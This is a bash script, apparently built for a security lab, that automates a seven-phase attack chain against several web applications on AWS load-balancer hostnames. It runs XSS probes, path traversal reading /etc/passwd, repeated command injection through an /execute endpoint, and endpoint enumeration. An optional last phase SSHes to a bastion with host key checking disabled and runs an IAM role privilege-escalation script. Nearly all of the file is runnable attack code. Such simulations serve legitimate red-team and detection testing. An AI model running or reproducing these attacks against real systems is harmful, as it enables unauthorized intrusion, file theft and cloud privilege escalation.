#!/bin/bash

# Complete attack chain - executes all attacks gradually from local machine
# Simulates realistic attack progression with proper timing

set -euo pipefail

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Get URLs from environment or use defaults
WEB_URL="${WEB_URL:-http://af27f94ff0dd5475abf27381998b12fc-2136651876.eu-central-1.elb.amazonaws.com:3000}"
API_URL="${API_URL:-http://a98f78674a87c490fb96ee76715e9518-288516544.eu-central-1.elb.amazonaws.com:5000}"
LEGACY_URL="${LEGACY_URL:-http://a88e2ebd02375423d87211a4aaef867d-356569397.eu-central-1.elb.amazonaws.com:8080}"
BLOG_URL="${BLOG_URL:-http://a8e30c27f440045a190fb51d1fd10062-1007446821.eu-central-1.elb.amazonaws.com:8081}"
ECOM_URL="${ECOM_URL:-http://ac9c51258fda44a149fb400ec24e8d02-1766768.eu-central-1.elb.amazonaws.com:8082}"
BASTION_IP="${BASTION_IP:-}"

echo -e "${RED}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║         Complete Attack Chain - Sequential Execution         ║"
echo "║                  (Lab Only)                                  ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}\n"

echo -e "${CYAN}Target URLs:${NC}"
echo -e "  Web App:     $WEB_URL"
echo -e "  API:         $API_URL"
echo -e "  Legacy App:  $LEGACY_URL"
echo ""

# Function to wait between attacks
wait_between() {
    local seconds=${1:-2}
    echo -e "${YELLOW}  [⏱]  Waiting ${seconds}s...${NC}\n"
    sleep $seconds
}

# Function to execute attack phase
execute_phase() {
    local phase_num=$1
    local phase_name=$2
    shift 2
    local commands=("$@")
    
    echo -e "${BLUE}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║  Phase ${phase_num}: ${phase_name}${NC}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${NC}\n"
    
    for cmd in "${commands[@]}"; do
        eval "$cmd"
        wait_between 2
    done
}

# Phase 1: Reconnaissance
execute_phase "1" "Reconnaissance & Initial Access" \
    "echo -e '${YELLOW}[1.1] Testing service accessibility...${NC}' && \
     for url in \"$WEB_URL\" \"$API_URL\" \"$LEGACY_URL\"; do \
         status=\$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 \"\$url\" 2>/dev/null || echo '000'); \
         if [ \"\$status\" = '200' ]; then \
             echo -e '${GREEN}  ✓ \$(echo \$url | cut -d'/' -f3) accessible (HTTP \$status)${NC}'; \
         else \
             echo -e '${RED}  ✗ \$(echo \$url | cut -d'/' -f3) not accessible (HTTP \$status)${NC}'; \
         fi; \
     done" \
    "echo -e '${YELLOW}[1.2] Information gathering - Debug endpoint...${NC}' && \
     env_data=\$(curl -s \"$WEB_URL/debug\" 2>/dev/null); \
     if [ -n \"\$env_data\" ]; then \
         echo -e '${GREEN}  ✓ Debug endpoint exposed${NC}'; \
         env_count=\$(echo \"\$env_data\" | jq -r '.env | length' 2>/dev/null || echo 'multiple'); \
         echo -e '${CYAN}    Found '\$env_count' environment variables${NC}'; \
     fi"

# Phase 2: Web Application Exploitation
execute_phase "2" "Web Application Exploitation" \
    "echo -e '${YELLOW}[2.1] XSS Attack...${NC}' && \
     response=\$(curl -s \"$WEB_URL/search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E\"); \
     if echo \"\$response\" | grep -q 'script'; then \
         echo -e '${GREEN}  ✓ XSS vulnerability confirmed${NC}'; \
     else \
         echo -e '${YELLOW}  ⚠ XSS may be filtered${NC}'; \
     fi" \
    "echo -e '${YELLOW}[2.2] Path Traversal...${NC}' && \
     response=\$(curl -s \"$WEB_URL/file?name=../../../etc/passwd\"); \
     if echo \"\$response\" | grep -q 'root:'; then \
         echo -e '${GREEN}  ✓ Path Traversal successful${NC}'; \
         echo -e '${CYAN}    Retrieved /etc/passwd${NC}'; \
     else \
         echo -e '${YELLOW}  ⚠ Path Traversal may be blocked${NC}'; \
     fi" \
    "echo -e '${YELLOW}[2.3] Command Injection...${NC}' && \
     response=\$(curl -s -X POST \"$WEB_URL/execute\" -H 'Content-Type: application/json' -d '{\"command\":\"id\"}'); \
     if echo \"\$response\" | grep -q 'uid='; then \
         echo -e '${GREEN}  ✓ Command Injection successful${NC}'; \
         echo -e '${CYAN}    Executed: id${NC}'; \
     else \
         echo -e '${YELLOW}  ⚠ Command Injection may be blocked${NC}'; \
     fi" \
    "echo -e '${YELLOW}[2.4] Information Disclosure...${NC}' && \
     debug=\$(curl -s \"$WEB_URL/debug\" 2>/dev/null); \
     if [ -n \"\$debug\" ]; then \
         echo -e '${GREEN}  ✓ Debug information exposed${NC}'; \
         echo -e '${CYAN}    Kubernetes service discovery data leaked${NC}'; \
     fi"

# Phase 3: API Exploitation
execute_phase "3" "API Exploitation" \
    "echo -e '${YELLOW}[3.1] API Health Check...${NC}' && \
     health=\$(curl -s \"$API_URL/health\" 2>/dev/null); \
     if echo \"\$health\" | grep -q 'healthy'; then \
         echo -e '${GREEN}  ✓ API is healthy${NC}'; \
     else \
         echo -e '${RED}  ✗ API health check failed${NC}'; \
     fi" \
    "echo -e '${YELLOW}[3.2] API Endpoint Enumeration...${NC}' && \
     for endpoint in '/api/users' '/api/products' '/'; do \
         response=\$(curl -s \"$API_URL\$endpoint\" 2>/dev/null); \
         if [ -n \"\$response\" ] && [ \$(echo \"\$response\" | wc -c) -gt 10 ]; then \
             echo -e '${GREEN}  ✓ Endpoint accessible: \$endpoint${NC}'; \
         fi; \
     done"

# Phase 4: Legacy Application
execute_phase "4" "Legacy Application Access" \
    "echo -e '${YELLOW}[4.1] Legacy App Access...${NC}' && \
     response=\$(curl -s \"$LEGACY_URL/\" 2>/dev/null); \
     if echo \"\$response\" | grep -qi 'vulnerable\|legacy'; then \
         echo -e '${GREEN}  ✓ Legacy application accessible${NC}'; \
         title=\$(echo \"\$response\" | grep -o '<title>.*</title>' | head -1); \
         echo -e '${CYAN}    \$title${NC}'; \
     else \
         echo -e '${RED}  ✗ Legacy application not accessible${NC}'; \
     fi"

# Phase 5: Advanced Exploitation
execute_phase "5" "Advanced Exploitation" \
    "echo -e '${YELLOW}[5.1] Multiple Command Injections...${NC}' && \
     for cmd in 'whoami' 'uname -a' 'pwd' 'ls -la /'; do \
         response=\$(curl -s -X POST \"$WEB_URL/execute\" -H 'Content-Type: application/json' -d \"{\\\"command\\\":\\\"\$cmd\\\"}\" 2>/dev/null); \
         if [ -n \"\$response\" ]; then \
             echo -e '${GREEN}  ✓ Command executed: \$cmd${NC}'; \
         fi; \
         sleep 1; \
     done" \
    "echo -e '${YELLOW}[5.2] File System Exploration...${NC}' && \
     for file in '/etc/passwd' '/etc/hosts' '/proc/version'; do \
         response=\$(curl -s \"$WEB_URL/file?name=../../\$file\" 2>/dev/null); \
         if [ -n \"\$response\" ] && [ \$(echo \"\$response\" | wc -c) -gt 20 ]; then \
             echo -e '${GREEN}  ✓ File readable: \$file${NC}'; \
         fi; \
     done"

# Phase 6: Additional Applications
execute_phase "6" "Additional Applications" \
    "echo -e '${YELLOW}[6.1] Blog App...${NC}' && \
     response=\$(curl -s \"$BLOG_URL/\" 2>/dev/null); \
     if [ -n \"\$response\" ] && echo \"\$response\" | grep -q 'html'; then \
         echo -e '${GREEN}  ✓ Blog application accessible${NC}'; \
     else \
         echo -e '${YELLOW}  ⚠ Blog application may not be accessible${NC}'; \
     fi" \
    "echo -e '${YELLOW}[6.2] E-commerce App...${NC}' && \
     response=\$(curl -s \"$ECOM_URL/\" 2>/dev/null); \
     if [ -n \"\$response\" ] && echo \"\$response\" | grep -q 'html'; then \
         echo -e '${GREEN}  ✓ E-commerce application accessible${NC}'; \
     else \
         echo -e '${YELLOW}  ⚠ E-commerce application may not be accessible${NC}'; \
     fi" \
    "echo -e '${YELLOW}[6.3] Voting App...${NC}' && \
     VOTING_URL=\"\${VOTING_URL:-http://ad8512b5692d9457da88ce9329cd97c6-1574672033.eu-central-1.elb.amazonaws.com:8080}\"; \
     response=\$(curl -s \"\$VOTING_URL/\" 2>/dev/null); \
     if [ -n \"\$response\" ] && echo \"\$response\" | grep -qi 'voting\|survey'; then \
         echo -e '${GREEN}  ✓ Voting application accessible${NC}'; \
     else \
         echo -e '${YELLOW}  ⚠ Voting application may not be accessible${NC}'; \
     fi"

# Phase 7: IAM Role Exploitation (via bastion)
if [ -n "$BASTION_IP" ]; then
    execute_phase "7" "Cloud Privilege Escalation (via Bastion)" \
        "echo -e '${YELLOW}[7.1] Exploiting IAM Role...${NC}' && \
         ssh -p 22222 -o StrictHostKeyChecking=no ubuntu@$BASTION_IP \
             'cd ~/exploitation && export EXPLOITATION_ROLE_ARN=\"arn:aws:iam::203918880757:role/exploitation-admin-role\" && \
              ./exploit-iam-role.sh 2>&1 | tail -25' || \
         echo -e '${YELLOW}  ⚠ IAM exploitation may need manual execution${NC}'"
else
    echo -e "${BLUE}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║  Phase 7: Cloud Privilege Escalation (Skipped)            ║${NC}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${NC}\n"
    echo -e "${YELLOW}  ⚠ BASTION_IP not set, skipping IAM exploitation${NC}"
    echo -e "${CYAN}    Set BASTION_IP environment variable to enable${NC}\n"
fi

# Summary
echo -e "${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║           Complete Attack Chain Finished                     ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}\n"

echo -e "${GREEN}Summary of attacks executed:${NC}"
echo -e "  ✓ Phase 1: Reconnaissance & Information Gathering"
echo -e "  ✓ Phase 2: Web Application Exploitation"
echo -e "    - XSS (Cross-Site Scripting)"
echo -e "    - Path Traversal"
echo -e "    - Command Injection"
echo -e "    - Information Disclosure"
echo -e "  ✓ Phase 3: API Exploitation"
echo -e "  ✓ Phase 4: Legacy Application Access"
echo -e "  ✓ Phase 5: Advanced Exploitation"
echo -e "  ✓ Phase 6: Additional Applications"
if [ -n "$BASTION_IP" ]; then
    echo -e "  ✓ Phase 7: Cloud Privilege Escalation (IAM Role)"
fi

echo -e "\n${CYAN}All attacks executed gradually to simulate realistic attack progression${NC}"
echo -e "${YELLOW}Total execution time: ~2-3 minutes${NC}\n"

